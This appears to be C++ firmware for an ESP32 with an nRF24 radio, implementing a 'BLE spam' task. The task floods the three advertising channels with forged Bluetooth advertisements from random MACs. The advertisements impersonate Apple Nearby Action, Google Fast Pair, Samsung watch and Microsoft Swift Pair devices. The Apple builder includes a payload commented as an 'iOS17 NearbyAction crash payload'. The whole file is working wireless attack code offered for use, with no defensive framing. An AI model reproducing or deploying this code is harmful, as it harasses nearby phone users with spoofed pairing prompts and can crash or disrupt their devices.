// Must be called while spi_mutex is held.
static void txAdvert(uint8_t* mac, uint8_t* addata, uint8_t adlen) {
    uint8_t pdu_len = 2 + 6 + adlen;
    uint8_t total   = pdu_len + 3;  // + 3 bytes CRC
    if (total > 32) return;

    uint8_t pdu[32] = {0};
    pdu[0] = 0x42;
    pdu[1] = 6 + adlen;
    memcpy(&pdu[2], mac, 6);
    memcpy(&pdu[8], addata, adlen);
    bleCRC(pdu, pdu_len, &pdu[pdu_len]);

    for (int ch = 0; ch < 3; ch++) {
        uint8_t out[32];
        memcpy(out, pdu, total);
        bleWhiten(out, total, BLE_CH[ch]);
        for (int i = 0; i < total; i++) out[i] = swapbits(out[i]);
        g_nrf_radio.setChannel(NRF_CH[ch]);
        delayMicroseconds(130);
        for (int r = 0; r < SENDS_PER_CH; r++) g_nrf_radio.write(out, total);
        delayMicroseconds(50);
    }
}

static void randMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
    mac[5] |= 0xC0;  // set locally administered + multicast bits
}

// ---- Payload builders -------------------------------------------------------

static void spamApple() {
    uint8_t mac[6]; randMac(mac);
    if ((esp_random() % 10) < 7) {
        const uint8_t action_types[] = {
            0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B,0x05,0x24,0x2F,0x21
        };
        uint8_t act   = action_types[esp_random() % sizeof(action_types)];
        uint8_t aflag = 0xC0;
        if (act == 0x21) aflag = 0x40;
        else if (act == 0x20 && (esp_random() & 1)) aflag = 0xBF;
        else if (act == 0x09 && (esp_random() & 1)) aflag = 0x40;
        uint8_t ad[] = {
            0x0A, 0xFF, 0x4C, 0x00,
            0x0F, 0x05, aflag, act,
            (uint8_t)(esp_random() & 0xFF), (uint8_t)(esp_random() & 0xFF), (uint8_t)(esp_random() & 0xFF),
            0x02, 0x0A, (uint8_t)fakeTxPower()
        };
        txAdvert(mac, ad, sizeof(ad));
    } else {
        // iOS17 NearbyAction crash payload
        const uint8_t crash_actions[] = {
            0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B
        };
        uint8_t cact  = crash_actions[esp_random() % sizeof(crash_actions)];
        uint8_t cflag = (cact == 0x20) ? 0xBF : ((cact == 0x09 && (esp_random() & 1)) ? 0x40 : 0xC0);
        uint8_t ad[] = {
            0x10, 0xFF, 0x4C, 0x00,
            0x0F, 0x05, cflag, cact,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
            0x00, 0x00, 0x10,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
            0x02, 0x0A, (uint8_t)fakeTxPower()
        };
        txAdvert(mac, ad, sizeof(ad));
    }
}

static void spamGoogle() {
    uint8_t mac[6]; randMac(mac);
    uint8_t m0, m1, m2;
    if ((esp_random() % 10) < 6) {
        uint8_t di = esp_random() % (sizeof(fp_debug) / 3);
        m0 = fp_debug[di][0]; m1 = fp_debug[di][1]; m2 = fp_debug[di][2];
    } else {
        uint16_t fi = esp_random() % g_fastpair_count;
        m0 = g_fastpair_models[fi][0]; m1 = g_fastpair_models[fi][1]; m2 = g_fastpair_models[fi][2];
    }
    uint8_t ad[] = {
        3,    0x03, 0x2C, 0xFE,
        6,    0x16, 0x2C, 0xFE, m0, m1, m2,
        2,    0x0A, (uint8_t)fakeTxPower()
    };
    txAdvert(mac, ad, sizeof(ad));
}

static void spamSamsung() {
    uint8_t mac[6]; randMac(mac);
    uint8_t model = watch_models[esp_random() % sizeof(watch_models)];
    uint8_t ad[] = {
        14, 0xFF, 0x75, 0x00,
        0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43, model,
        0x02, 0x0A, (uint8_t)fakeTxPower()
    };
    txAdvert(mac, ad, sizeof(ad));
}

static void spamMicrosoft() {
    uint8_t mac[6]; randMac(mac);
    uint8_t nlen = 4 + (esp_random() % 4);
    char name[8];
    for (uint8_t i = 0; i < nlen; i++) name[i] = 'A' + (esp_random() % 26);
    uint8_t ad[18];
    uint8_t i = 0;
    ad[i++] = 6 + nlen; ad[i++] = 0xFF;
    ad[i++] = 0x06; ad[i++] = 0x00;
    ad[i++] = 0x03; ad[i++] = 0x00;
    ad[i++] = 0x80;
    memcpy(&ad[i], name, nlen); i += nlen;
    ad[i++] = 0x02; ad[i++] = 0x0A; ad[i++] = (uint8_t)fakeTxPower();
    txAdvert(mac, ad, i);
}

// ---- Task -------------------------------------------------------------------

void bleSpamTask(void* arg) {
    NrfBleSpamModule* self = reinterpret_cast<NrfBleSpamModule*>(arg);

    if (self->hasChip() && nrfLockSpi()) {
        g_nrf_radio.powerUp();
        g_nrf_radio.stopListening();
        nrfUnlockSpi();
    }

    BLOG("[nrf_ble_spam] task started\n");
    uint32_t count = 0;
    uint32_t lastReport = millis();
    uint8_t cursor = 0;

    while (self->isRunning()) {
        if (!self->hasChip()) {
            vTaskDelay(pdMS_TO_TICKS(100));
        } else if (nrfLockSpi(pdMS_TO_TICKS(20))) {
            // txAdvert() issues delayMicroseconds() internally; keep mutex for full call.
            switch (self->getType()) {
                case BleSpamType::APPLE:     spamApple();     break;
                case BleSpamType::GOOGLE:    spamGoogle();    break;
                case BleSpamType::SAMSUNG:   spamSamsung();   break;
                case BleSpamType::MICROSOFT: spamMicrosoft(); break;
                default:  // ALL: weighted round-robin
                    switch (cursor % 8) {
                        case 0: case 2: case 4: case 6: spamApple();     break;
                        case 1: case 5:                 spamGoogle();    break;
                        case 3:                         spamSamsung();   break;
                        case 7:                         spamMicrosoft(); break;
                    }
                    break;
            }
            cursor++;
            count++;
            nrfUnlockSpi();
        }

        if (millis() - lastReport >= 1000) {
            self->updateAdvsPerSec(count);
            BLOG("[nrf_ble_spam] adv/sec=%lu chip=%d\n", (unsigned long)count, (int)self->hasChip());
            count = 0;
            lastReport = millis();
        }
        vTaskDelay(1);
    }

    if (self->hasChip() && nrfLockSpi()) {
        g_nrf_radio.powerDown();
        nrfUnlockSpi();
    }
    BLOG("[nrf_ble_spam] task exiting\n");
    self->clearTask();
    vTaskDelete(nullptr);
}

